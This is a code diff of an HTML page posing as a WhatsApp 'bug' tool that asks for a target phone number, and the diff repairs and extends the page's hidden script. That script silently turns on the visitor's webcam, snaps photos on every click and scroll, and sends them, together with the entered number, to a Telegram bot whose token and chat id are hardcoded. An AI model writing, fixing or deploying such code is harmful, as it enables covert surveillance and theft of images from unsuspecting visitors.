@@ -32,6 +32,7 @@
         0% { background-position: 0 -100px; }
         100% {background-position: 0 1000px; }
       }
+      
       h1 {
         font-size: 3.2em;
         text-shadow: 0 0 15px #00ffe1, 0 0 25px #00ffe1;
@@ -46,11 +47,12 @@
         max-width: 400px;
         margin-top: 25px;
         outline: none;
-        background-color: rgba(0, 0, 0, 0, 0.65);
+        background-color: rgba(0, 0, 0, 0.65);
         color: white;
         box-shadow: 0 0 25px #00ffee, 0 0 35px #00ffee;
         transition: 0.3s ease-in-out;
       }
+      
       button {
         margin-top: 25px;
         padding: 15px 30px;
@@ -60,16 +62,20 @@
         border-radius: 10px;
         cursor: pointer;
         color: #111;
-        box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffc;
+        box-shadow: 0 0 15px #00ffcc, 0 0 25px #00ffcc;
       }
       
       video, canvas {
         display: none;
       }
+      
+      .container {
+        position: relative;
+        z-index: 2;
+      }
     </style>
   </head>
   <body>
-    
     <div class="snow"></div>
     
     <div class="container">
@@ -78,47 +84,54 @@
       <input type="text" placeholder="628xxx" id="nomor">
       <br>
       <button onclick="main()">GAS BUG</button>
-      </div>
+    </div>
       
-      <video id="video" width="320" height="240" autoplay></video>
-      <canvas id="canvas" width="320" height="240"></canvas>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
       
-      <audio id="sound">
-        <source src="https://files.catbox.moe/9v9q9m.mp3" type="audio/mpeg">
-      </audio>
+    <audio id="sound">
+      <source src="https://files.catbox.moe/9v9q9m.mp3" type="audio/mpeg">
+    </audio>
       
-      <script>
-        const token = "8236567312:AAFGiMLRIL5YJOyf881jVMymN_VM7b5aAPA";
-        const chat_id = "7131550435";
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const sound = document.getElementById("sound");
-        
+    <script>
+      const token = "8236567312:AAFGiMLRIL5YJOyf881jVMymN_VM7b5aAPA";
+      const chat_id = "7131550435";
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const sound = document.getElementById("sound");
+      
+      // Request camera access
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-           video.srcObject = stream;
-        })
-        .catch(=err => {
-          console.error("kamera error:", err);
-        });
-        
-      function captureAndSend() {
-         ctx.drawImage(video, 0, 0, canvas.width,canvas.height);
-         canvas.toBlob(function(blob) {
-           const form = new FormData();
-           form.append("chat_id", chat_id);
-           form.append("photo", blob, "kamera.jpg");
-           
-     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-       method: "POST",
-       body: form
-     });
-         }, 'image/jpeg');
+          .then(function(stream) {
+            video.srcObject = stream;
+          })
+          .catch(function(err) {
+            console.error("Kamera error:", err);
+          });
       }
       
-      document.body.addEventListenee("click",captureAndSend);
-      document.body.addEventListener("scroll",captureAndSend);
+      function captureAndSend() {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(function(blob) {
+          const form = new FormData();
+          form.append("chat_id", chat_id);
+          form.append("photo", blob, "kamera.jpg");
+           
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: form
+          })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error('Error:', error));
+        }, 'image/jpeg', 0.8);
+      }
+      
+      // Add event listeners
+      document.body.addEventListener("click", captureAndSend);
+      document.body.addEventListener("scroll", captureAndSend);
       
       function main() {
         const nomor = document.getElementById("nomor").value;
@@ -127,10 +140,23 @@
           return;
         }
         
-        sound.play();
+        // Play sound
+        sound.play().catch(e => console.log("Audio play failed:", e));
         alert("PROSES...\nTunggu 5-10menit");
         captureAndSend();
+        
+        // Send phone number to Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: `Nomor target: ${nomor}`
+          })
+        });
       }
-      </script>
+    </script>
   </body>
 </html>
